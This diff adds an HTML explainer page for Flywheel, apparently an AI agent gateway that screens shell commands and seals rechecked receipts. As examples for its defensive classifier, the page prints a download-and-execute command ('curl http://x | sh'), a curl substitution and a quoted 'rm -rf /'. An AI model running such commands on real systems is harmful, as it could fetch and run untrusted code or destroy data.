@@ -1,0 +1,562 @@
+<!doctype html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How Flywheel works</title>
+<meta name="description" content="An animated walk through Flywheel: how it decides whether a tool request may run, and how a sealed receipt is rechecked offline to MATCH, DRIFT or UNVERIFIABLE. Every example is real output from flywheel at commit 1ec701d.">
+<link rel="canonical" href="https://harperz9.github.io/repo-explainers/flywheel.html">
+<style>
+/*CORE_CSS*/
+/* flywheel scenes */
+.life-node rect{fill:var(--sheet);stroke:var(--line-strong);stroke-width:1;transition:stroke .3s,stroke-width .3s}
+.life-node.lit rect{stroke:var(--ink);stroke-width:2}
+.life-node text{fill:var(--ink);font-family:var(--font-sans)}
+.life-node .n{font-family:var(--font-mono);fill:var(--muted)}
+.life-edge{stroke:var(--line-strong);stroke-width:1;fill:none}
+.life-refuse{stroke:var(--drift);stroke-width:1.5;fill:none;stroke-dasharray:5 4;opacity:.35;transition:opacity .3s}
+.life-refuse.lit{opacity:1}
+.life-refuse-label{fill:var(--drift);font-family:var(--font-mono);opacity:.45;transition:opacity .3s}
+.life-refuse-label.lit{opacity:1}
+.life-token{fill:var(--ink);transition:transform .55s var(--ease)}
+.life-out text{font-family:var(--font-mono);font-weight:600}
+.cmdline{font-family:var(--font-mono);font-size:clamp(1rem,2.4vw,1.35rem);padding:.6rem .7rem;background:var(--sunk);border:1px solid var(--line);display:flex;flex-wrap:wrap;gap:.35rem;align-items:baseline}
+.cmdline .p{color:var(--muted)}
+.tok{padding:.05rem .3rem;border-bottom:2px solid transparent;transition:border-color .35s,opacity .35s}
+.tok.exe{border-bottom-color:var(--ink);font-weight:600}
+.tok.str,.tok.arg{opacity:.62}
+.tok.op{opacity:.62}
+.tok.pre{opacity:.5;text-decoration:line-through;text-decoration-thickness:1px}
+.tok.bad{border-bottom:2px dashed var(--unverifiable)}
+.walklist{list-style:none;padding:0;margin:.9rem 0;font-family:var(--font-mono);font-size:.82rem}
+.walklist li{display:grid;grid-template-columns:5.5rem minmax(0,1fr);gap:.6rem;padding:.35rem 0;border-bottom:1px solid var(--line)}
+.walklist .d{color:var(--muted)}
+.walklist .empty{grid-template-columns:1fr;color:var(--muted)}
+.decision{border:1px solid var(--line-strong);padding:.7rem .8rem;display:grid;gap:.35rem}
+.decision .big{font-size:1.3rem}
+.decision .why{font-family:var(--font-sans);font-size:.92rem;color:var(--ink-soft)}
+.cands{display:grid;grid-template-columns:repeat(auto-fit,minmax(9.5rem,1fr));gap:.5rem;margin:.6rem 0}
+.cand{border:1px solid var(--line);padding:.5rem .6rem;font-family:var(--font-mono);font-size:.74rem;transition:opacity .4s,border-color .4s}
+.cand b{font-size:.85rem}
+.cand.win{border-color:var(--ink);border-width:2px}
+.cand.dim{opacity:.35}
+.scheme{border-collapse:collapse;font-family:var(--font-mono);font-size:.72rem;width:100%;margin-top:.4rem}
+.scheme th,.scheme td{border-bottom:1px solid var(--line);padding:.18rem .3rem;text-align:left;white-space:nowrap}
+.scheme th{color:var(--muted);font-weight:400}
+.env{border:2px solid var(--ink);padding:.7rem .8rem;margin-top:.6rem}
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin:.6rem 0}
+.cmp>div{border:1px solid var(--line);padding:.5rem .6rem}
+.result{margin-top:.7rem;font-size:1.25rem}
+.chain{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:.4rem;margin:.6rem 0}
+.rcpt{border:1px solid var(--line-strong);padding:.7rem .6rem;font-family:var(--font-mono);font-size:.78rem;position:relative;transition:border-color .35s}
+.rcpt b{font-size:.95rem;display:block;margin-bottom:.35rem}
+.rcpt+.rcpt::before{content:"";position:absolute;left:-.4rem;top:50%;width:.4rem;border-top:1px solid var(--line-strong)}
+.scene.center{display:flex;flex-direction:column;justify-content:safe center}
+.scene.center:not(.is-on){display:flex}
+.rcpt .h{overflow-wrap:anywhere}
+.rcpt.edited{border-color:var(--drift);border-width:2px}
+.rcpt.broken{border-style:dashed;border-color:var(--unverifiable)}
+.rcpt.mark{color:var(--drift)}
+@media (max-width:640px){.rcpt+.rcpt::before{display:none}.chain{grid-template-columns:1fr}.rcpt{display:grid;grid-template-columns:5rem 1fr;gap:.2rem .5rem}.rcpt b{grid-row:span 2}}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top wrap">
+  <div class="crumbs"><a href="https://github.com/HarperZ9/flywheel">HarperZ9/flywheel</a><span>Explainer, built from commit <a href="https://github.com/HarperZ9/flywheel/tree/1ec701de1b6ce08604ef3ec0dad80551d6fa3391">1ec701d</a></span><a href="https://harperz9.github.io/repo-explainers.html">All repository explainers</a><button type="button" class="btn theme" data-theme-toggle>Dark page</button></div>
+  <h1>Flywheel</h1>
+  <p class="lede">Run any model, frontier or local, and keep a receipt you can recheck offline.</p>
+</header>
+<main id="main">
+<section class="block wrap" aria-labelledby="for-you">
+  <h2 id="for-you">What it does for you</h2>
+  <div class="measure">
+    <p>Flywheel sits between you and the model you choose. It gives you one local endpoint for any model, it checks every tool request an agent makes before anything runs, and it writes a receipt for each accepted result that a stranger can recheck later with no network and no model.</p>
+  </div>
+  <ul class="uses">
+    <li><b>One endpoint, any model</b>A local gateway on <code>127.0.0.1:8799</code> speaks the OpenAI API to a hosted or a local model. Your provider keys stay on your machine.</li>
+    <li><b>An agent that asks first</b>The coding agent classifies each command it wants to run. A refused request goes back to the model with the reason, and the record keeps it.</li>
+    <li><b>Receipts you can recheck</b>An accepted result is sealed with its hashes. A recheck re-runs the check and answers MATCH, DRIFT or UNVERIFIABLE.</li>
+    <li><b>A desktop app</b>The Windows installer bundles the engine, so the app runs on a machine with no Python installed.</li>
+  </ul>
+  <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/README.md">README.md</a> at 1ec701d</p>
+</section>
+
+<section class="block wrap" aria-labelledby="watch">
+  <h2 id="watch">Watch</h2>
+  <figure class="film">
+    <video controls preload="none" playsinline crossorigin="anonymous" width="1920" height="1080" poster="https://harperz9.github.io/media/explainers/rederive/poster.jpg">
+      <source src="https://harperz9.github.io/media/explainers/rederive/rederive.mp4" type="video/mp4">
+      <track kind="captions" src="https://harperz9.github.io/media/explainers/rederive/rederive.vtt" srclang="en" label="English">
+    </video>
+    <figcaption><b>Re-derive it. Don&#x27;t take it on trust.</b> (2 min 5 s, narrated, captioned). Flywheel is built on the idea in this film: accept a result only when it can be re-derived. <a href="https://harperz9.github.io/explainers.html#rederive-h">Transcript, sources and recall questions</a>.</figcaption>
+  </figure>
+  <p class="soon">Video walkthrough: coming with the next release.</p>
+</section>
+
+<section class="block wrap" aria-labelledby="how">
+  <h2 id="how">How it works, one step at a time</h2>
+  <p class="measure">Scroll, or use the step buttons. The panel shows the mechanism; the text beside it says what you are looking at. Every command, hash and verdict below came from running the code at commit 1ec701d.</p>
+  <div class="walk">
+    <div class="stage-wrap">
+      <div class="stage" aria-label="Animated diagram for the current step">
+        <div class="scene" data-scene="life" aria-hidden="true"><svg id="life-svg" role="img" aria-label="Eight stages of a run in order: task, route, tool request, capability check, execute, receipt, ledger, recheck. A dashed path leads from the capability check back to the tool request for refused calls."></svg></div>
+        <div class="scene" data-scene="cap" aria-hidden="true">
+          <div class="tag">the request, as the shell would read it</div>
+          <div class="cmdline" id="cap-line"></div>
+          <div class="tag" style="margin-top:.8rem">executables found, in walk order</div>
+          <ul class="walklist reveal" id="cap-walk"></ul>
+          <div class="decision reveal" id="cap-dec"></div>
+          <div class="pick" id="cap-pick" role="group" aria-label="Try another command"></div>
+        </div>
+        <div class="scene" data-scene="gate" aria-hidden="true">
+          <div id="gate-collect">
+            <div class="tag">task: a rank-7 scheme for the 2 x 2 matrix product</div>
+            <div class="cands" id="gate-cands"></div>
+          </div>
+          <div id="gate-scheme">
+            <div class="tag">seed 0, Strassen's seven products (coefficients on the four entries of A, B and C)</div>
+            <table class="scheme" id="gate-table"><thead><tr><th>product</th><th>u (A)</th><th>v (B)</th><th>w (C)</th></tr></thead><tbody></tbody></table>
+          </div>
+          <div id="gate-env" class="env reveal">
+            <div class="tag">gate_envelope.json, sealed</div>
+            <dl class="kv">
+              <dt>task_id</dt><dd>gate-matmul-2x2x2</dd>
+              <dt>candidate</dt><dd>seed 0, the scheme above</dd>
+              <dt>oracle</dt><dd>matmul_bilinear</dd>
+              <dt>verdict</dt><dd>PASS</dd>
+              <dt>oracle_output_hash</dt><dd>93e4b6c6b7a05c82</dd>
+              <dt>envelope_hash</dt><dd>1993af18b980c95d</dd>
+              <dt>claim_hash</dt><dd>23450831b0b42121</dd>
+            </dl>
+          </div>
+          <div id="gate-rw" class="reveal">
+            <div class="cmp">
+              <div><div class="tag">stored in the envelope</div><dl class="kv"><dt>verdict</dt><dd>PASS</dd><dt>output</dt><dd>93e4b6c6b7a05c82</dd></dl></div>
+              <div><div class="tag">oracle re-run now</div><dl class="kv"><dt>verdict</dt><dd>PASS</dd><dt>output</dt><dd>93e4b6c6b7a05c82</dd></dl></div>
+            </div>
+            <div class="result"><span class="v v-ok vbox">MATCH</span> <span class="tag">flywheel gate exits 0 only on MATCH</span></div>
+          </div>
+        </div>
+        <div class="scene center" data-scene="tamper" aria-hidden="true">
+          <div class="tag">change one thing in gate_envelope.json, then recheck</div>
+          <div class="pick" id="tamper-pick" role="group" aria-label="Choose a change"></div>
+          <div class="cmp reveal" id="tamper-cmp"></div>
+          <div class="result reveal" id="tamper-res"></div>
+        </div>
+        <div class="scene center" data-scene="chain" aria-hidden="true">
+          <div class="tag">five stage receipts, each holding the hash of the one before it</div>
+          <div class="chain" id="chain"></div>
+          <div class="result reveal" id="chain-res"></div>
+        </div>
+      </div>
+      <div class="stage-bar">
+        <button type="button" class="btn" data-prev>Previous</button>
+        <span class="cap" data-cap aria-live="polite"></span>
+        <span data-count></span>
+        <button type="button" class="btn" data-next>Next</button>
+      </div>
+    </div>
+    <ol class="steps">
+      <li class="step" tabindex="-1" data-scene="life" data-state="run"><div class="card">
+        <span class="num">01</span><h3>One run, end to end</h3>
+        <p>You send a task to the model you picked. When the model asks to run a tool, Flywheel classifies the request before anything runs. An allowed call runs, and its arguments and output are hashed into a receipt. A refused call goes back to the model with the reason, so it can pick another route.</p>
+        <p>Receipts form an ordered chain. A later recheck recomputes that chain with no network and no model in the loop.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/docs/art/run-lifecycle.svg">docs/art/run-lifecycle.svg</a>, README "How a run works"</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="cap" data-state="pipe"><div class="card">
+        <span class="num">02</span><h3>A command the model asks for</h3>
+        <p>Start with one request. The model wants to run <code>curl http://x | sh</code>. Flywheel parses it the way a shell would and finds two executables. <code>curl</code> can reach the network. <code>sh</code> would run whatever <code>curl</code> downloads.</p>
+        <p>Network egress is denied by default, so the call is blocked with the reason code <code>denied_capability:network_egress</code>. Nothing ran. The download-and-run finding stays in the record next to it.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/shell_admission.py">harness/shell_admission.py</a>, <code>classify_command</code> and <code>DENY_BY_DEFAULT</code></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="cap" data-state="quote"><div class="card">
+        <span class="num">03</span><h3>Quoted text is an argument</h3>
+        <p><code>echo "rm -rf /"</code> looks alarming to a keyword filter. The parser reads the quotes first, so the delete is a string handed to <code>echo</code>. Only the executable position is classified. The command runs and prints the string.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/shell_admission.py">harness/shell_admission.py</a>, module docstring, point 1</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="cap" data-state="subst"><div class="card">
+        <span class="num">04</span><h3>A substitution is walked into</h3>
+        <p>In <code>echo "$(curl http://x)"</code> the shell runs the substitution before <code>echo</code> sees anything. The walk follows it to depth 1, finds <code>curl</code>, and blocks the call. The outer word settles nothing.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/shell_admission.py">harness/shell_admission.py</a>, module docstring, point 2</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="cap" data-state="parse"><div class="card">
+        <span class="num">05</span><h3>What cannot be parsed goes to a person</h3>
+        <p><code>echo "unterminated</code> has no closing quote. The parser cannot read it, so Flywheel cannot say what it would do. It escalates with <code>unparseable_command_fail_closed</code>, and a person decides.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/shell_admission.py">harness/shell_admission.py</a>, the <code>AdmissionError</code> branch</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="cap" data-state="unknown"><div class="card">
+        <span class="num">06</span><h3>The gap, stated openly</h3>
+        <p><code>ls -la build/</code> runs. The map of executable names is curated by hand and short. An executable it has never seen is admitted, so a test runner can work, and the record writes its class down as <code>unknown</code>.</p>
+        <p>The receipt for a decision carries the capability class, the reason code and a hash of the arguments. It never stores the command text. Use the buttons in the panel to try all seven commands.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/shell_admission.py">harness/shell_admission.py</a>, "Honest nulls" and "Trace hygiene"</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="gate" data-state="collect"><div class="card">
+        <span class="num">07</span><h3>A result worth sealing</h3>
+        <p>The receipt half is easiest to see with no model in the way. <code>flywheel gate</code> runs a fixed task: multiply two 2 x 2 matrices with seven products where the schoolbook method needs eight. This is the scheme Strassen found. A deterministic proposer offers four candidates. Seed 0 is Strassen's scheme. Seeds 1 to 3 each have one coefficient raised by one.</p>
+        <p>The oracle expands each candidate and compares it with the exact matrix product tensor over the rationals. It reads data and never executes candidate code. One candidate passes.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/gate.py">harness/gate.py</a>, <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/matmul_oracle.py">harness/matmul_oracle.py</a></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="gate" data-state="seal"><div class="card">
+        <span class="num">08</span><h3>Seal it</h3>
+        <p>The passing candidate goes into a proof envelope with the oracle's name, its output hash and the verdict. Two hashes identify the envelope: one over its content, one over the claim it makes.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/gate.py">harness/gate.py</a>, <code>run_gate</code>, the seal step</p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="gate" data-state="rewitness"><div class="card">
+        <span class="num">09</span><h3>Recheck it</h3>
+        <p>The recheck reads the envelope back, runs the same oracle over the stored candidate, and compares two values: the verdict and the oracle's output hash. Both agree, so the answer is MATCH.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/gate.py">harness/gate.py</a>, <code>rewitness_envelope</code></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="tamper" data-state="coef"><div class="card">
+        <span class="num">10</span><h3>Change one thing</h3>
+        <p>Edit the stored candidate by one coefficient and the oracle now says FAIL while the envelope still says PASS: DRIFT. Rewrite the stored verdict to FAIL and the fresh run disagrees again: DRIFT.</p>
+        <p>Delete the envelope, or remove its candidate, and there is nothing to re-run. The recheck never assumes MATCH. It answers UNVERIFIABLE, a gap in the record and never a pass. Pick each change in the panel.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/gate.py">harness/gate.py</a>, <code>rewitness_envelope</code></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="chain" data-state="intact"><div class="card">
+        <span class="num">11</span><h3>Receipts chain together</h3>
+        <p>A run leaves one receipt per stage: boot, propose, policy, verify, accept. Each receipt stores the hash of the receipt before it. Recompute every hash in order and every link agrees: MATCH.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/chain.py">harness/chain.py</a>, <code>append_stage</code> and <code>validate_chain</code></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="chain" data-state="broken"><div class="card">
+        <span class="num">12</span><h3>An edit breaks the next link</h3>
+        <p>Edit the policy receipt after the fact. Its hash changes, so the pointer stored in the verify receipt no longer agrees. Validation stops at stage 3 and answers UNVERIFIABLE.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/chain.py">harness/chain.py</a>, <code>validate_chain</code></p>
+      </div></li>
+      <li class="step" tabindex="-1" data-scene="chain" data-state="rewit"><div class="card">
+        <span class="num">13</span><h3>Intact links are half the answer</h3>
+        <p>A chain of forged verdicts with intact links still passes the structural check. So a recheck can also re-witness each stage. Here the verify stage stored PASS and a fresh run returns FAIL: DRIFT at stage 3, with every link intact.</p>
+        <p class="src">Source: <a href="https://github.com/HarperZ9/flywheel/blob/1ec701de1b6ce08604ef3ec0dad80551d6fa3391/harness/chain.py">harness/chain.py</a>, <code>validate_chain</code> docstring</p>
+      </div></li>
+    </ol>
+  </div>
+</section>
+
+<section class="block wrap" aria-labelledby="walkthrough">
+  <h2 id="walkthrough">Walkthrough</h2>
+  <p class="measure">Install it, run it once, then use the main feature. Each command below is real, and so is its output.</p>
+  <ol class="walkthrough">
+    <li><h3>Install</h3><p>Install the engine from PyPI. Python 3.11 or newer; no model and no network once installed.</p>
+<pre class="cmd"><code>$ python -m pip install flywheel-verify</code></pre></li>
+    <li><h3>First run: the gate</h3><p>Run the gate. It collects a result, verifies it, seals it, and re-witnesses the seal.</p>
+<pre class="cmd"><code>$ flywheel gate
+<span class="out">  collect: group_size=4, temperature=1.0, estimator=drgrpo, n_pass=1, learnable=True, n_undecided=0, n_excluded=0, signal_hash=dda8a7414a71c071
+  verify: verdict=PASS, output_hash=93e4b6c6b7a05c82, attribution=CANDIDATE
+  seal: envelope_hash=1993af18b980c95d, claim_hash=23450831b0b42121, path=gate_envelope.json
+  rewitness: result=MATCH
+verdict=PASS rewitness=MATCH
+subject=1993af18b980c95d claim=23450831b0b42121 signal=dda8a7414a71c071</span></code></pre></li>
+    <li><h3>Classify a command</h3><p>Ask the admission layer what it would do with a command before an agent runs it.</p>
+<pre class="cmd"><code>$ python -c "import harness.shell_admission as a; print(a.classify_command('curl http://x | sh').reason_code)"
+<span class="out">denied_capability:network_egress</span></code></pre></li>
+    <li><h3>Start the gateway and browser shell</h3><p>Bring up the local gateway and open the shell on <code>http://127.0.0.1:8799</code>.</p>
+<pre class="cmd"><code>$ flywheel up</code></pre></li>
+  </ol>
+  <p class="src">The output above came from flywheel-verify 1.5.0 installed from PyPI on Windows with Python 3.12, and matches a run of the source at commit 1ec701d. The desktop app is on the <a href="https://github.com/HarperZ9/flywheel/releases/latest">latest release</a>.</p>
+</section>
+
+<section class="block wrap" aria-labelledby="limits">
+  <h2 id="limits">What it does not do</h2>
+  <ul class="limits">
+    <li>A recheck shows that a recorded result reproduces. It does not show that a model's answer is correct. A reproducible check still needs a fitting criterion and enough evidence, and replay alone does not establish safety.</li>
+    <li>The capability map is curated by hand. An executable it does not list is admitted and recorded as unknown.</li>
+    <li>A structural chain MATCH is tamper evidence. It says nothing about whether the stored verdicts were true until each stage is re-witnessed.</li>
+    <li>The content of each request goes to the model provider you pick, under that provider's terms. With a local model it stays on your machine.</li>
+    <li>The gate shown here has no model in it on purpose. It tests the oracle, receipt and recheck path, and it says nothing about model quality.</li>
+    <li>No capability uplift is claimed. The project's one capability comparison is negative: continued pretraining moved general code completion by -3.05 points over 164 tasks, p = 0.40.</li>
+  </ul>
+  <p class="src">Source: README.md "Verification record" and "Benchmarks", harness/chain.py, harness/shell_admission.py at 1ec701d</p>
+</section>
+
+<section class="block wrap recall" aria-labelledby="recall">
+  <h2 id="recall">Check what stuck</h2>
+  <p class="measure">Answer each one in your head before you open it.</p>
+  <details><summary>Why does <code>echo "rm -rf /"</code> run while <code>echo "$(curl http://x)"</code> is blocked?</summary><p>Quotes make the delete an argument to echo, and only executables are classified. The substitution runs before echo, so the walk descends into it and finds curl, which needs network egress.</p></details>
+  <details><summary>What happens to a tool request that is refused?</summary><p>Nothing runs. The reason goes back to the model so it can choose another route, and the record keeps the request, the refusal and the reason.</p></details>
+  <details><summary>In the gate, which two values does the recheck compare?</summary><p>The verdict and the oracle's output hash, after re-running the oracle over the candidate stored in the envelope.</p></details>
+  <details><summary>An edited verdict gives DRIFT and a missing envelope gives UNVERIFIABLE. Why keep them apart?</summary><p>DRIFT means a fresh check ran and disagrees with the record. UNVERIFIABLE means no check could run. Reporting a gap as a pass would hide exactly the case a reader most needs to see.</p></details>
+  <details><summary>What does an intact chain prove, and what does it leave open?</summary><p>It proves no receipt was edited after the fact. It leaves open whether the stored verdicts were right; re-witnessing each stage answers that.</p></details>
+</section>
+</main>
+<footer class="foot wrap">
+  <p>Built from <a href="https://github.com/HarperZ9/flywheel/tree/1ec701de1b6ce08604ef3ec0dad80551d6fa3391">HarperZ9/flywheel at 1ec701d</a> (release 1.5.0). The source of this page is <code>docs/explainer/index.html</code> in that repository. Flywheel is released under FSL-1.1-MIT.</p>
+  <p>Zain Dana Harper. <a href="https://harperz9.github.io/repo-explainers.html">More repository explainers</a>.</p>
+</footer>
+<script>
+/*CORE_JS*/
+</script>
+<script>
+(function () {
+  "use strict";
+  var EX = window.EX = window.EX || {}; EX.scenes = EX.scenes || {};
+  var el = function () { return EX.el.apply(null, arguments); };
+
+  /* ---- 1. the run lifecycle ---- */
+  var STAGES = [["01", "Task"], ["02", "Route"], ["03", "Tool request"], ["04", "Capability check"],
+    ["05", "Execute"], ["06", "Receipt"], ["07", "Ledger"], ["08", "Recheck"]];
+  var PATH = [0, 1, 2, 3, 2, 3, 4, 5, 6, 7];   // 3 -> 2 is the refused request coming back
+  function lifeLayout(w) {
+    var narrow = w < 520, pos = [], W, H;
+    if (narrow) {          // two columns, four rows, snaking down
+      W = 320; H = 560;
+      for (var i = 0; i < 8; i++) {
+        var row = Math.floor(i / 2), col = row % 2 ? 1 - (i % 2) : i % 2;
+        pos.push([20 + col * 160, 30 + row * 112]);
+      }
+      return { W: W, H: H, nw: 120, nh: 62, pos: pos, fs: 14, out: [20, 500] };
+    }
+    W = 600; H = 420;
+    for (var j = 0; j < 8; j++) {
+      var r = j < 4 ? 0 : 1, c = r ? 7 - j : j;
+      pos.push([18 + c * 146, r ? 230 : 70]);
+    }
+    return { W: W, H: H, nw: 124, nh: 66, pos: pos, fs: 14, out: [18, 360] };
+  }
+  function drawLife(state, reduce) {
+    var svg = document.getElementById("life-svg");
+    var box = svg.parentNode.getBoundingClientRect();
+    var L = lifeLayout(box.width);
+    while (svg.firstChild) svg.removeChild(svg.firstChild);
+    svg.setAttribute("viewBox", "0 0 " + L.W + " " + L.H);
+    var c = function (i) { return [L.pos[i][0] + L.nw / 2, L.pos[i][1] + L.nh / 2]; };
+    for (var e = 0; e < 7; e++) {
+      var a = c(e), b = c(e + 1);
+      svg.appendChild(el("line", { class: "life-edge", x1: a[0], y1: a[1], x2: b[0], y2: b[1] }));
+    }
+    var p3 = L.pos[3], p2 = L.pos[2];
+    var refuse = el("path", { class: "life-refuse", d: "M" + (p3[0] + L.nw / 2) + " " + p3[1] + " C " + (p3[0] + L.nw / 2) + " " + (p3[1] - (L.W < 400 ? 30 : 46)) + ", " + (p2[0] + L.nw / 2) + " " + (p2[1] - (L.W < 400 ? 30 : 46)) + ", " + (p2[0] + L.nw / 2) + " " + p2[1] });
+    svg.appendChild(refuse);
+    var nar = L.W < 400;
+    var rl = el("text", { class: "life-refuse-label", x: (p2[0] + p3[0] + L.nw) / 2, y: nar ? p2[1] - 8 : Math.max(12, p2[1] - 40), "text-anchor": "middle", "font-size": nar ? 10 : 11 }, nar ? "refused" : "refused: reason back to the model");
+    svg.appendChild(rl);
+    var nodes = STAGES.map(function (s, i) {
+      var g = el("g", { class: "life-node", transform: "translate(" + L.pos[i][0] + " " + L.pos[i][1] + ")" });
+      g.appendChild(el("rect", { width: L.nw, height: L.nh, rx: 2 }));
+      g.appendChild(el("text", { class: "n", x: 10, y: 20, "font-size": 11 }, s[0]));
+      g.appendChild(el("text", { x: 10, y: 44, "font-size": L.fs, "font-weight": 600 }, s[1]));
+      svg.appendChild(g);
+      return g;
+    });
+    var outs = [["MATCH", "v-ok", "the chain recomputes"], ["DRIFT", "v-drift", "a fresh check disagrees"], ["UNVERIFIABLE", "v-unv", "the evidence is missing"]];
+    outs.forEach(function (o, i) {
+      var narrow = L.W < 400;
+      var x = L.out[0] + (narrow ? 0 : i * 196), y = L.out[1] + (narrow ? i * 0 : 0);
+      if (narrow) { x = L.out[0] + i * 100; }
+      var g = el("g", { class: "life-out " + o[1], transform: "translate(" + x + " " + y + ")" });
+      g.appendChild(el("text", { x: 0, y: 14, "font-size": narrow ? 11 : 13, fill: "currentColor" }, o[0]));
+      if (!narrow) g.appendChild(el("text", { x: 0, y: 32, "font-size": 11, style: "fill:var(--muted);font-weight:400;font-family:var(--font-sans)" }, o[2]));
+      svg.appendChild(g);
+    });
+    var tok = el("circle", { class: "life-token", r: 7, cx: 0, cy: 0 });
+    svg.appendChild(tok);
+    var place = function (i) { var q = c(i); tok.setAttribute("transform", "translate(" + q[0] + " " + (L.pos[i][1] + L.nh - 12) + ")"); };
+    if (reduce) {
+      nodes.forEach(function (n) { n.classList.add("lit"); });
+      refuse.classList.add("lit"); rl.classList.add("lit");
+      place(7);
+      return;
+    }
+    var k = 0;
+    var tick = function () {
+      var i = PATH[k];
+      place(i);
+      nodes.forEach(function (n, j) { n.classList.toggle("lit", j === i); });
+      var back = k === 4;
+      refuse.classList.toggle("lit", back); rl.classList.toggle("lit", back);
+      k = (k + 1) % PATH.length;
+      EX.later(tick, k === 0 ? 1800 : 900);
+    };
+    tick();
+  }
+  EX.scenes.life = drawLife;
+
+  /* ---- 2. the capability check, seven real commands ---- */
+  var CMDS = {
+    pipe: { cmd: "curl http://x | sh", toks: [["curl", "exe"], ["http://x", "arg"], ["|", "op"], ["sh", "exe"]],
+      f: [["curl", "network_egress", 0, false], ["sh", "code_download_exec", 0, false]],
+      d: "BLOCK", r: "denied_capability:network_egress", why: "Egress decides because it is found first. The download-and-run finding rides along in the record." },
+    quote: { cmd: 'echo "rm -rf /"', toks: [["echo", "exe"], ['"rm -rf /"', "str"]],
+      f: [["echo", "unknown", 0, false]], d: "ALLOW", r: "no_dangerous_capability", why: "Quotes are parsed before capabilities are read, so the delete is an argument to echo." },
+    grep: { cmd: "grep 'curl' notes.txt", toks: [["grep", "exe"], ["'curl'", "str"], ["notes.txt", "arg"]],
+      f: [["grep", "unknown", 0, false]], d: "ALLOW", r: "no_dangerous_capability", why: "A denied name inside a quoted argument is text. Only the executable position is classified." },
+    subst: { cmd: 'echo "$(curl http://x)"', toks: [["echo", "exe"], ['"$(', "op"], ["curl", "exe"], ["http://x", "arg"], [')"', "op"]],
+      f: [["echo", "unknown", 0, false], ["curl", "network_egress", 1, true]], d: "BLOCK", r: "denied_capability:network_egress", why: "The substitution runs first, so the walk goes into it. The outer echo settles nothing." },
+    env: { cmd: "FOO=bar curl http://x", toks: [["FOO=bar", "pre"], ["curl", "exe"], ["http://x", "arg"]],
+      f: [["curl", "network_egress", 0, false]], d: "BLOCK", r: "denied_capability:network_egress", why: "A variable set ahead of a command is a prefix. The walk steps over it and reads what follows." },
+    parse: { cmd: 'echo "unterminated', toks: [["echo", "exe"], ['"unterminated', "bad"]],
+      f: [], d: "ESCALATE", r: "unparseable_command_fail_closed", why: "The parser cannot read it, so nothing is admitted. A person sees it before a shell does." },
+    unknown: { cmd: "ls -la build/", toks: [["ls", "exe"], ["-la", "arg"], ["build/", "arg"]],
+      f: [["ls", "unknown", 0, false]], d: "ALLOW", r: "no_dangerous_capability", why: "ls is absent from the curated map. It is admitted so an oracle can work, and recorded as unknown." }
+  };
+  var ORDER = ["quote", "grep", "subst", "pipe", "env", "parse", "unknown"];
+  var DCLASS = { BLOCK: "v-drift", ALLOW: "", ESCALATE: "v-unv" };
+  function showCmd(id, reduce) {
+    var c = CMDS[id];
+    var line = document.getElementById("cap-line");
+    line.textContent = "";
+    line.appendChild(el("span", { class: "p", "aria-hidden": "true" }, "$"));
+    c.toks.forEach(function (t) { line.appendChild(el("span", { class: "tok " + t[1] }, t[0])); });
+    var walk = document.getElementById("cap-walk");
+    var dec = document.getElementById("cap-dec");
+    walk.textContent = ""; dec.textContent = "";
+    walk.classList.remove("in"); dec.classList.remove("in");
+    if (!c.f.length) {
+      walk.appendChild(el("li", { class: "empty" }, "no tree: the parser stopped at the unclosed quote"));
+    }
+    c.f.forEach(function (f) {
+      var li = el("li");
+      li.appendChild(el("span", { class: "d" }, "depth " + f[2] + (f[3] ? ", $( )" : "")));
+      var right = el("span");
+      right.appendChild(el("b", null, f[0]));
+      right.appendChild(document.createTextNode("  " + f[1]));
+      li.appendChild(right);
+      walk.appendChild(li);
+    });
+    var big = el("div", { class: "big" });
+    big.appendChild(el("span", { class: "v vbox " + DCLASS[c.d] }, c.d));
+    dec.appendChild(big);
